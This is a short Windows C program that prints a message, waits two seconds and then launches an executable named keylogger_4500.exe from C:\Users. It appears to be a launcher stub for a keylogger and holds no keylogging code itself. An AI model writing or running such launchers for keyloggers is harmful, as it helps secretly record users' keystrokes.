#include <windows.h>
#include <winuser.h>   
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

void main()
{
	printf("Run Keylogger_4500.exe");
	Sleep(2000);
	WinExec("C:\\Users\\keylogger_4500.exe", SW_SHOW);
}